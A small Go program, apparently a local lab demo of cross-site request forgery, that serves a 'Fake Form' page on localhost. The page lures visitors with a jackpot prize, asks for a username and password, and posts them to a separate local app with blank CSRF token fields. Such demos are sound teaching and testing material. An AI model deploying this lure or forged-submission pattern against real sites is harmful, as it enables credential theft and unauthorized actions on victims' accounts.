package main

import (
	"fmt"
	"html/template"
	"net/http"
)

func hacked(w http.ResponseWriter, r *http.Request) {
	hackerform := `
	<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Form</title>
</head>
<body>
        <form action="http://localhost:9090/postform" method="POST">
        <h2>Enter your details to win a jackpot!!</h2>
        <label><b>Username</b></label>
        <input type="text" placeholder="Enter Username" name="username">

        <label><b>Password</b></label>
        <input type="password" placeholder="Enter password" name="password">

        <input type="hidden" name="csrf_token" value="">
        <input type="submit" value="POST">
        <input type="hidden" name="csrf" value="">
        </form>
</body>
</html>
	`
	fake_tmpl := template.Must(template.New("tfake").Parse(hackerform))
	fake_tmpl.Execute(w, nil)
}

func main() {
	http.HandleFunc("/", hacked)
	fmt.Println("Listening on http://localhost:9091/")

	http.ListenAndServe(":9091", nil)

}
